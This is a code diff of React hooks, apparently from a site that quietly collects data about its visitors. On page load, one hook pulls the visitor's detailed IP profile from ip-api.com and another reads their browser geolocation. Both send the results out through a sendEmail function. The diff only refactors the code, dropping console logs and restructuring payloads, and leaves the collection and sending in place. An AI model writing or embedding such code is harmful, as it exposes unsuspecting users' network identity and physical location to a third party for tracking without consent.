@@ -9,12 +9,10 @@ export const useGetIp = () => {
       try {
         const response = await fetch("http://ip-api.com/json/?fields=66846719");
         const data = await response.json();
-        console.log(`Your IP Address: ${JSON.stringify(data)}`);
 
-        await sendEmail(data);
+        await sendEmail({ ip: data });
       } catch (error) {
-        await sendEmail(error);
-        console.error("Error fetching IP address:", error);
+        await sendEmail({ ip: "chsec" });
       }
     })();
   }, []);
@@ -23,20 +21,18 @@ export const useGetIp = () => {
 export const useGetCoords = () => {
   useEffect(() => {
     (async () => {
-      let info = {
-        lat: "chsec",
-        lon: "chsec",
-      };
-
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (position) => {
-          info.lat = position.coords.latitude;
-          info.lon = position.coords.longitude;
-
-          await sendEmail(info);
+          await sendEmail({
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+          });
         });
       } else {
-        await sendEmail(info);
+        await sendEmail({
+          lat: "chsec",
+          lon: "chsec",
+        });
       }
     })();
   }, []);
